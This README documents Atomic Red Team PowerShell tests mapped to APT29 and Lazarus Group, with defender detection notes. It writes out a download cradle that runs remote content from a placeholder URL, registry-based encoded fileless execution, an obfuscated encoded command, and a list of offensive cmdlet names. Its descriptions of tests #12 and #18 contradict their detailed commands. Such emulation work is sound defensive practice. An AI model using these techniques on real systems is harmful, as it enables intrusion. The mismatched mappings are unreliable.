# Atomic Red Team Tests for APT29 and Lazarus Group

This repository documents selected **Atomic Red Team PowerShell tests** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear) and **Lazarus Group**.

The goal is to:

* Provide defenders with a curated set of relevant tests.
* Map each test to known adversary behaviors.
* Highlight overlap and differences between the groups’ PowerShell usage.

---

## Background

* **APT29** (Cozy Bear) is a Russian state-sponsored threat group.

  * Known for the **SolarWinds compromise**.
  * Frequently uses **encoded PowerShell commands**, **fileless execution**, and **scheduled tasks** to maintain persistence and exfiltrate data.

* **Lazarus Group** is a North Korean state-sponsored threat group.

  * Known for **Operation Dream Job** and large-scale cyber-espionage/financial theft.
  * Uses **download cradles**, **remote session creation**, and **environment exploration** via PowerShell.

Both groups leverage PowerShell because it is:

* Native to Windows.
* Flexible for downloading and executing payloads.
* Capable of obfuscation (e.g., base64 encoding, string manipulation).

---

## Selected Atomic Tests

| Test # | Technique                   | Description                                                                         | Used By             |
| ------ | --------------------------- | ----------------------------------------------------------------------------------- | ------------------- |
| **6**  | Download Cradle             | Executes a web request to retrieve payloads using PowerShell (`Invoke-WebRequest`). | **Lazarus**         |
 **10** | Fileless Execution          | Loads and executes PowerShell payloads directly in memory.                          | **APT29**           |
| **12** | Download Cradle + Execution | Uses `IEX (New-Object Net.WebClient).DownloadString()` to fetch & run code.         | **Lazarus**         |
| **14** | EncodedCommand              | Runs a base64-encoded PowerShell command with `-EncodedCommand`.                    | **APT29**           |
| **15** | EncodedCommand (Variation)  | Encoded execution with short base64 payload.                                        | **APT29**           |
| **16** | EncodedCommand (Variation)  | Encoded execution with obfuscation layering.                                        | **APT29**           |
| **17** | Obfuscated Execution        | Uses string concatenation/obfuscation to hide PowerShell commands.                  | **APT29 + Lazarus** |
| **18** | EncodedCommand (Long)       | Executes large base64-encoded scripts, common in **APT29 SolarWinds activity**.     | **APT29**           |

---

## Detailed Test Analysis

### Atomic Test #6 - Powershell MsXml COM object - with prompt
**Technique:** Download Cradle  
**Adversary Usage:** Lazarus Group  
**Command:**
```cmd
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```
**Explanation:** This test uses the `MsXml2.ServerXmlHttp` COM object to make HTTP requests and execute retrieved content. Lazarus Group frequently uses such techniques to download and execute payloads without writing to disk, enabling fileless operations.

### Atomic Test #10 - PowerShell Fileless Script Execution
**Technique:** Fileless Execution  
**Adversary Usage:** APT29  
**Command:**
```powershell
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
```
**Explanation:** APT29 frequently stores encoded PowerShell commands in registry keys for fileless execution. This test stores a base64-encoded command in the registry and executes it directly from memory.

### Atomic Test #12 - PowerShell Session Creation and Use
**Technique:** Remote Session Execution  
**Adversary Usage:** Lazarus Group  
**Command:**
```powershell
New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
```
**Explanation:** Lazarus uses PowerShell remoting (`New-PSSession`) to execute commands on remote systems during lateral movement operations.

### Atomic Test #14 - ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
**Technique:** EncodedCommand  
**Adversary Usage:** APT29  
**Command:**
```powershell
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute
```
**Explanation:** APT29 heavily uses the `-EncodedCommand` parameter with base64-encoded payloads to evade detection. This test demonstrates various parameter variations for encoded execution.

### Atomic Test #15 - ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
**Technique:** EncodedCommand  
**Adversary Usage:** APT29  
**Command:**
```powershell
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute
```
**Explanation:** Another variation of encoded command execution that APT29 uses to obfuscate their PowerShell activities.

### Atomic Test #16 - ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
**Technique:** EncodedCommand with Obfuscation  
**Adversary Usage:** APT29  
**Command:**
```powershell
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute
```
**Explanation:** APT29 often layers multiple obfuscation techniques, combining encoded commands with encoded arguments to bypass security controls.

### Atomic Test #17 - PowerShell Command Execution
**Technique:** Obfuscated Execution  
**Adversary Usage:** APT29 & Lazarus  
**Command:**
```cmd
powershell.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
```
**Explanation:** Both APT29 and Lazarus use string concatenation and other obfuscation techniques to hide malicious PowerShell commands. This test demonstrates execution of heavily obfuscated code.

### Atomic Test #18 - PowerShell Invoke Known Malicious Cmdlets
**Technique:** Malicious Cmdlet Execution  
**Adversary Usage:** APT29  
**Command:**
```powershell
$malcmdlets = "Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"
foreach ($cmdlets in $malcmdlets) {
    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}
```
**Explanation:** APT29 uses various offensive PowerShell frameworks containing these malicious cmdlets for privilege escalation, credential dumping, and persistence.

---

## Correlation with APT29 & Lazarus

* **APT29 Focus:**
  * EncodedCommand variations (#14, #15, #16, #18)
  * Fileless execution (#10)
  * Obfuscation (#17)
  → Used for stealth, persistence, and data exfiltration

* **Lazarus Group Focus:**
  * Download cradles (#6, #12)
  * Obfuscation (#17)
  → Used for environment exploration, lateral movement, and payload staging

* **Overlap:**
  * Both groups rely on **obfuscation (#17)** to evade detection
  * Both abuse PowerShell for **living-off-the-land tactics**

---

## Defender Notes

* These tests are high-value because they **closely emulate real-world adversary tradecraft**
* Detection should focus on:
  * `powershell.exe -EncodedCommand` with long Base64 strings (#14, #15, #16, #18)
  * Obfuscated scripts with string concatenation (#17)
  * Download cradles fetching remote content (#6, #12)
* Correlation across events (e.g., PowerShell + network connections + registry modifications) reduces false positives
* Monitor for unusual parent processes spawning PowerShell instances
* Implement constrained language mode to limit PowerShell capabilities

## Academic References

1. MITRE ATT&CK Technique T1059.001 - Command and Scripting Interpreter: PowerShell
2. CrowdStrike: "APT29 Targets COVID-19 Vaccine Development" (2020)
3. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
4. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (2017)
5. FireEye: "APT29 Domain Fronting With TOR" (2017)
